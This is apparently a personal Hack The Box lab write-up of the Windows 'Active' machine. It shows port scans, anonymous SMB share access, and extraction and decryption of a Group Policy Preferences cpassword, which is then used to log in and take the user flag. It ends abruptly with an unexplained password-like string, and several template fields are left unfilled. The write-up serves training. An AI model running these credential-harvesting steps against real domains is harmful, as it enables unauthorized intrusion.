# [Active] - [HTB]
**Difficulty:** [Easy]  
**OS:** [Windows]  
**Date:** [05/09/2025]  
**Machine Type:** [OSCP]

---

## 1. Summary
- **Objective:** [ ] Capture user flag  
- **Objective:** [ ] Capture root flag / administrator access  
- **Description / Notes:** [Brief overview of the machine, main services, challenges]  
- **Skills Practiced:** 
  - [X] Enumeration
  - [X] Web Exploitation
  - [X] Privilege Escalation

---

## 2. Recon & Enumeration

### 2.1 Network Scanning
```bash
# Nmap Quick Scan
┌──(sabeshan㉿kali)-[~]
└─$ sudo mousepad /etc/hosts    
[sudo] password for sabeshan: 
Sorry, try again.
[sudo] password for sabeshan: 
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~]
└─$ rustscan -b 4500 -t 2000 -a 10.10.10.100 --ulimit 10000 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/sabeshan/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.10.100:53
Open 10.10.10.100:88
Open 10.10.10.100:135
Open 10.10.10.100:139
Open 10.10.10.100:389
Open 10.10.10.100:445
Open 10.10.10.100:464
Open 10.10.10.100:593
Open 10.10.10.100:636
Open 10.10.10.100:5722
Open 10.10.10.100:9389
Open 10.10.10.100:47001
Open 10.10.10.100:49154
Open 10.10.10.100:49153
Open 10.10.10.100:49155
Open 10.10.10.100:49152
Open 10.10.10.100:49158
Open 10.10.10.100:49157
Open 10.10.10.100:49163
Open 10.10.10.100:49176
Open 10.10.10.100:49174
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.10.10.100
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 17:07 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
Initiating Ping Scan at 17:07
Scanning 10.10.10.100 [4 ports]
Completed Ping Scan at 17:07, 0.22s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:07
Scanning active.htb (10.10.10.100) [21 ports]
Discovered open port 53/tcp on 10.10.10.100
Discovered open port 135/tcp on 10.10.10.100
Discovered open port 445/tcp on 10.10.10.100
Discovered open port 139/tcp on 10.10.10.100
Discovered open port 49176/tcp on 10.10.10.100
Discovered open port 593/tcp on 10.10.10.100
Discovered open port 49154/tcp on 10.10.10.100
Discovered open port 49157/tcp on 10.10.10.100
Discovered open port 88/tcp on 10.10.10.100
Discovered open port 464/tcp on 10.10.10.100
Discovered open port 9389/tcp on 10.10.10.100
Discovered open port 49153/tcp on 10.10.10.100
Discovered open port 49158/tcp on 10.10.10.100
Discovered open port 49152/tcp on 10.10.10.100
Discovered open port 49155/tcp on 10.10.10.100
Discovered open port 49174/tcp on 10.10.10.100
Discovered open port 5722/tcp on 10.10.10.100
Discovered open port 47001/tcp on 10.10.10.100
Discovered open port 636/tcp on 10.10.10.100
Discovered open port 389/tcp on 10.10.10.100
Discovered open port 49163/tcp on 10.10.10.100
Completed SYN Stealth Scan at 17:07, 0.44s elapsed (21 total ports)
Initiating Service scan at 17:07
Scanning 21 services on active.htb (10.10.10.100)
Service scan Timing: About 61.90% done; ETC: 17:08 (0:00:35 remaining)
Completed Service scan at 17:08, 62.18s elapsed (21 services on 1 host)
Initiating OS detection (try #1) against active.htb (10.10.10.100)
Retrying OS detection (try #2) against active.htb (10.10.10.100)
Initiating Traceroute at 17:08
Completed Traceroute at 17:08, 0.25s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:08
Completed Parallel DNS resolution of 1 host. at 17:08, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.10.10.100.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 9.87s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 2.90s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 0.00s elapsed
Nmap scan report for active.htb (10.10.10.100)
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2025-09-05 17:07:19 IST for 82s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-05 11:37:47Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49163/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49174/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49176/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (98%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (97%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows 7 SP1 (95%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 (95%), Microsoft Windows Server 2008 R2 SP1 or Windows 7 SP1 (95%), Microsoft Windows Windows 7 SP1 (95%), Microsoft Windows Vista Home Premium SP1, Windows 7, or Windows Server 2008 (95%), Microsoft Windows Vista SP1 (94%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=9/5%OT=53%CT=%CU=41680%PV=Y%DS=2%DC=T%G=N%TM=68BACBC1%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=7)
SEQ(SP=FB%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=7)
OPS(O1=M577NW8ST11%O2=M577NW8ST11%O3=M577NW8NNT11%O4=M577NW8ST11%O5=M577NW8ST11%O6=M577ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%T=80%W=2000%O=M577NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.008 days (since Fri Sep  5 16:56:38 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-05T11:38:53
|_  start_date: 2025-09-05T11:27:46
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40086/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38631/udp): CLEAN (Timeout)
|   Check 4 (port 17846/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: 20s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   206.51 ms 10.10.14.1
2   248.57 ms active.htb (10.10.10.100)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.46 seconds
           Raw packets sent: 87 (5.536KB) | Rcvd: 53 (3.632KB)

```

# Service-specific scans
# SMB
```bash
┌──(sabeshan㉿kali)-[~]
└─$ smbmap -H active.htb                        

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.10.100:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections
```
```bash
┌──(sabeshan㉿kali)-[~]
└─$ smbclient \\\\10.10.10.100\\Replication 
Password for [WORKGROUP\sabeshan]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 16:07:44 2018
  ..                                  D        0  Sat Jul 21 16:07:44 2018
  active.htb                          D        0  Sat Jul 21 16:07:44 2018

                5217023 blocks of size 4096. 284237 blocks available
smb: \> cd active.htb\
smb: \active.htb\> ls 
  .                                   D        0  Sat Jul 21 16:07:44 2018
  ..                                  D        0  Sat Jul 21 16:07:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 16:07:44 2018
  Policies                            D        0  Sat Jul 21 16:07:44 2018
  scripts                             D        0  Thu Jul 19 00:18:57 2018
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (3.3 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.6 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (1.3 KiloBytes/sec) (average 0.9 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (4.4 KiloBytes/sec) (average 1.3 KiloBytes/sec)
smb: \> 
```
---------------------------------------------------------------------------------------------------------------------------------------
There are credentials were find there
```bash
?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
````
name="active.htb\SVC_TGS
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
-----------------------------------------------------------------------------------------------------------------------------------------
We extract the encrypted password form the Groups.xml file and decrypt it using gpp-decrypt .
```bash
┌──(sabeshan㉿kali)-[~]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

```baah
┌──(sabeshan㉿kali)-[~]
└─$ smbclient -L //10.10.10.100// -U 'SVC_TGS' 
Password for [WORKGROUP\SVC_TGS]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
I got the initial foothold with this and I moved on with this.
```bash
┌──(sabeshan㉿kali)-[~]
└─$ smbclient //10.10.10.100/Users -U 'SVC_TGS'
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 20:09:20 2018
  ..                                 DR        0  Sat Jul 21 20:09:20 2018
  Administrator                       D        0  Mon Jul 16 15:44:21 2018
  All Users                       DHSrn        0  Tue Jul 14 10:36:44 2009
  Default                           DHR        0  Tue Jul 14 12:08:21 2009
  Default User                    DHSrn        0  Tue Jul 14 10:36:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 10:27:55 2009
  Public                             DR        0  Tue Jul 14 10:27:55 2009
  SVC_TGS                             D        0  Sat Jul 21 20:46:32 2018

                5217023 blocks of size 4096. 279234 blocks available
smb: \> cd All Users\
cd \All\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> cd "All Users"
cd \All Users\: NT_STATUS_STOPPED_ON_SYMLINK
smb: \> cd SVC_TGS\
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 20:46:32 2018
  ..                                  D        0  Sat Jul 21 20:46:32 2018
  Contacts                            D        0  Sat Jul 21 20:44:11 2018
  Desktop                             D        0  Sat Jul 21 20:44:42 2018
  Downloads                           D        0  Sat Jul 21 20:44:23 2018
  Favorites                           D        0  Sat Jul 21 20:44:44 2018
  Links                               D        0  Sat Jul 21 20:44:57 2018
  My Documents                        D        0  Sat Jul 21 20:45:03 2018
  My Music                            D        0  Sat Jul 21 20:45:32 2018
  My Pictures                         D        0  Sat Jul 21 20:45:43 2018
  My Videos                           D        0  Sat Jul 21 20:45:53 2018
  Saved Games                         D        0  Sat Jul 21 20:46:12 2018
  Searches                            D        0  Sat Jul 21 20:46:24 2018

                5217023 blocks of size 4096. 279234 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 20:44:42 2018
  ..                                  D        0  Sat Jul 21 20:44:42 2018
  user.txt                           AR       34  Fri Sep  5 16:59:06 2025

                5217023 blocks of size 4096. 279234 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> exit
Ticketmaster1968
```
